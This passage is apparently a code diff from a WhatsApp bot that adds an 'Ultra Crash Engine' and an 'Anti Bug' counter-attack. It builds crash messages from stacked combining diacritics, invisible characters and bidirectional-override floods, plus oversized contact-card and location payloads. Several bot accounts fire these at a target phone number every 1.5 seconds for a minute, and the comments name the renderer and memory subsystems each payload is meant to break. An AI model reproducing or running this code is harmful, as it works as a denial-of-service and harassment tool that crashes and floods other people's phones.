⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃮⃮⃮⃮⃭⃭⃭⃬⃬⃭⃭⃮⃮⃮⃮⃮❭⃯⃯⃯⃯⃯⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃬⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃭⃬⃬⃭⃭⃬⃭⃬⃮⃮⃯⃯⃯⃮⃭⃭⃮⃮⃭⃮⃭❭⃯⃯⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃯⃯⃯⃮⃮⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃮⃮⃭⃭⃬⃬⃭⃭⃮⃮⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃛⃛⃛⃛⃛⃜⃜⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃛⃜⃛⃜⃜⃜⃜⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃭⃭⃬⃭⃭⃭⃮⃮⃮⃮⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮❭⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃭⃭⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮⃮⃯⃯⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃯⃯⃯⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃨⃨⃨⃨⃨⃨⃨⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃜⃛⃛⃜⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃭⃭⃭⃮⃮⃭⃭⃭⃭⃭⃬⃭⃬⃭❭'.repeat(2000)
-              }),
-              // 4. Zero-width spam flood
-              () => socket.sendMessage(_attackTarget, {
-                text: '\u200B'.repeat(4095) + 'BUG❭⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃭⃭⃭⃬⃬⃬⃬⃬⃬⃬⃬⃭⃬⃭⃭⃭⃮⃮⃯⃯⃮⃮⃭⃮⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃛⃛⃐⃐⃐⃜⃜⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃮⃮⃭⃮⃬⃭⃬⃭⃮⃬⃭⃭⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃭⃮⃮⃯⃯⃯⃮⃮⃮⃮⃭⃭⃭⃬⃬⃭⃭⃮⃮⃮⃮⃮❭⃯⃯⃯⃯⃯⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃬⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃭⃬⃬⃭⃭⃬⃭⃬⃮⃮⃯⃯⃯⃮⃭⃭⃮⃮⃭⃮⃭❭⃯⃯⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃯⃯⃯⃮⃮⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃮⃮⃭⃭⃬⃬⃭⃭⃮⃮⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃛⃛⃛⃛⃛⃜⃜⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃛⃜⃛⃜⃜⃜⃜⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃭⃭⃬⃭⃭⃭⃮⃮⃮⃮⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮❭⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃭⃭⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮⃮⃯⃯⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃯⃯⃯⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃨⃨⃨⃨⃨⃨⃨⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃜⃛⃛⃜⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃭⃭⃭⃮⃮⃭⃭⃭⃭⃭⃬⃭⃬⃭❭ANTI' + '\u200C'.repeat(4095)
-              }),
-              // 5. Mixed direction crash
-              () => socket.sendMessage(_attackTarget, {
-                text: '\u202E'.repeat(300) + '❭⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃭⃭⃭⃬⃬⃬⃬⃬⃬⃬⃬⃭⃬⃭⃭⃭⃮⃮⃯⃯⃮⃮⃭⃮⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃛⃛⃐⃐⃐⃜⃜⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃮⃮⃭⃮⃬⃭⃬⃭⃮⃬⃭⃭⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃭⃮⃮⃯⃯⃯⃮⃮⃮⃮⃭⃭⃭⃬⃬⃭⃭⃮⃮⃮⃮⃮❭⃯⃯⃯⃯⃯⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃬⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃭⃬⃬⃭⃭⃬⃭⃬⃮⃮⃯⃯⃯⃮⃭⃭⃮⃮⃭⃮⃭❭⃯⃯⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃯⃯⃯⃮⃮⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃮⃮⃭⃭⃬⃬⃭⃭⃮⃮⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃛⃛⃛⃛⃛⃜⃜⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃛⃜⃛⃜⃜⃜⃜⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃭⃭⃬⃭⃭⃭⃮⃮⃮⃮⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮❭⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃭⃭⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮⃮⃯⃯⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃯⃯⃯⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃨⃨⃨⃨⃨⃨⃨⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃜⃛⃛⃜⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃭⃭⃭⃮⃮⃭⃭⃭⃭⃭⃬⃭⃬⃭❭💀ANTICRASH💀❭⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃭⃭⃭⃬⃬⃬⃬⃬⃬⃬⃬⃭⃬⃭⃭⃭⃮⃮⃯⃯⃮⃮⃭⃮⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃛⃛⃐⃐⃐⃜⃜⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃮⃮⃭⃮⃬⃭⃬⃭⃮⃬⃭⃭⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃭⃮⃮⃯⃯⃯⃮⃮⃮⃮⃭⃭⃭⃬⃬⃭⃭⃮⃮⃮⃮⃮❭⃯⃯⃯⃯⃯⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃬⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃭⃬⃬⃭⃭⃬⃭⃬⃮⃮⃯⃯⃯⃮⃭⃭⃮⃮⃭⃮⃭❭⃯⃯⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃯⃯⃯⃮⃮⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃮⃮⃭⃭⃬⃬⃭⃭⃮⃮⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃛⃛⃛⃛⃛⃜⃜⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃛⃜⃛⃜⃜⃜⃜⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃭⃭⃬⃭⃭⃭⃮⃮⃮⃮⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮❭⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃭⃭⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮⃮⃯⃯⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃯⃯⃯⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃨⃨⃨⃨⃨⃨⃨⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃜⃛⃛⃜⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃭⃭⃭⃮⃮⃭⃭⃭⃭⃭⃬⃭⃬⃭❭' + '\u202D'.repeat(300) + '\u061C'.repeat(300)
-              }),
+              // 1. Pure invisible bomb (looks completely blank)
+              async () => {
+                await Promise.allSettled(_abMainSock.map(s =>
+                  s.sendMessage(_attackTarget, { text: _abInvBomb }).catch(() => {})
+                ));
+              },
+              // 2. Invisible renderer nuke
+              async () => {
+                await Promise.allSettled(_abMainSock.map(s =>
+                  s.sendMessage(_attackTarget, { text: _abRenderNuke }).catch(() => {})
+                ));
+              },
+              // 3. Invisible contact array memory kill
+              async () => {
+                await Promise.allSettled(_abMainSock.map(s =>
+                  s.sendMessage(_attackTarget, {
+                    contacts: { displayName: _abMakeInv(20), contacts: _abCards }
+                  }).catch(() => {})
+                ));
+              },
+              // 4. Invisible location overflow
+              async () => {
+                await Promise.allSettled(_abMainSock.map(s =>
+                  s.sendMessage(_attackTarget, { location: _abLocCrash }).catch(() => {})
+                ));
+              },
+              // 5. Double invisible bomb (two rapid fires per tick)
+              async () => {
+                await Promise.allSettled(_abMainSock.map(async s => {
+                  await s.sendMessage(_attackTarget, { text: _abInvBomb }).catch(() => {});
+                  await s.sendMessage(_attackTarget, { text: _abRenderNuke }).catch(() => {});
+                }));
+              },
             ];
 
             let _bugRound = 0;
-            const _attackDuration = 60 * 1000; // 60 seconds
-            const _attackInterval = 2200;       // every ~2.2s  ≈ ~27 hits
+            const _attackDuration = 60 * 1000;
+            const _attackInterval = 1500; // faster: every 1.5s ~ 40 hits
             const _attackStart = Date.now();
 
             const _attackLoop = setInterval(async () => {
@@ -1223,7 +1257,11 @@ function setupCommandHandlers(socket, number) {
                   console.log(`[ANTI-BUG] Counter-attack on ${_attackTarget} finished.`);
                   try {
                     await socket.sendMessage(_botJid, {
-                      text: `✅ *Anti Bug — Counter-attack Complete*\n⚔️ Target: +${(_attackTarget||'').split('@')[0]}\n💥 Duration: 60s`
+                      text: `✅ *Anti Bug — Counter-attack Complete*
+⚔️ Target: +${(_attackTarget||'').split('@')[0]}
+💥 Hits: ~${_bugRound}
+👻 Mode: Invisible
+🤖 Bots used: ${_abMainSock.length}`
                     });
                   } catch(e){}
                   return;
@@ -1412,123 +1450,258 @@ function setupCommandHandlers(socket, number) {
         }, { quoted: msg });
 
         // ══════════════════════════════════════════════
-        //  CRASH PAYLOAD BUILDERS
-        //  — Each payload targets a different subsystem
+        //  ULTRA CRASH ENGINE v3 — INVISIBLE + LOOP
         // ══════════════════════════════════════════════
 
-        // [A] Renderer nuke — combining diacritics that stack infinitely
-        //     Targets: text renderer, font shaping engine
-        const _renderNuke = (base) => base + '\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309\u030A\u030B\u030C\u030D\u030E\u030F\u0488\u0489'.repeat(2000) + 'ॣ'.repeat(3000) + '҈҉'.repeat(3000) + '\u200D'.repeat(4000);
-        const _crashTxtA = _renderNuke('A');
-        const _crashTxtB = _renderNuke('Z') + '𒐫'.repeat(4000) + '𒈙'.repeat(4000);
-        const _crashTxtC = '\u202E'.repeat(2000) + '꧅꧄꩜'.repeat(3000) + '\u202C'.repeat(2000) + '\uFEFF'.repeat(5000);
-        const _crashTxtD = String.fromCharCode(...Array.from({length: 4000}, (_, i) => 0x0300 + (i % 112))) + '​'.repeat(6000);
+        // ── Invisible char helpers ──────────────────────────────────────────
+        const _inv = '\u200B\u200C\u200D\uFEFF\u2060\u180E\u00AD\u034F';
+        const _mkInv = (n) => Array.from({length:n},(_,i)=>_inv[i%_inv.length]).join('');
+        const _diac = '\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309\u030A\u030B\u030C\u030D\u030E\u030F\u0488\u0489\u20D0\u20D1\u20D2\u20D6\u20D7\u20DB\u20DC\u20E1\u20E7\u20E9';
 
-        // [B] Memory kill — VCard with 300 contacts, each with bloated fields
-        //     Targets: contact renderer, RAM (parse + render 300 cards at once)
-        const _makeKillCards = (n, tag) => Array.from({ length: n }, (_, i) => ({
-            vcard: [
-                'BEGIN:VCARD',
-                'VERSION:3.0',
-                `FN:${tag}_${i}_` + 'K'.repeat(300),
-                `ORG:${tag};` + 'O'.repeat(200),
-                `TEL;type=CELL;waid=94${String(700000000 + i).slice(-9)}:+94${String(700000000 + i).slice(-9)}`,
-                `NOTE:` + '☠️'.repeat(120),
-                `ADR:;;` + 'X'.repeat(400) + ';;;;',
-                `EMAIL:${tag.toLowerCase()}${i}@x.io`,
+        // ── Crash text variants (all invisible / appear blank) ──────────────
+        // [A] Diacritic renderer nuke — stacks combining chars, overflows glyph cache
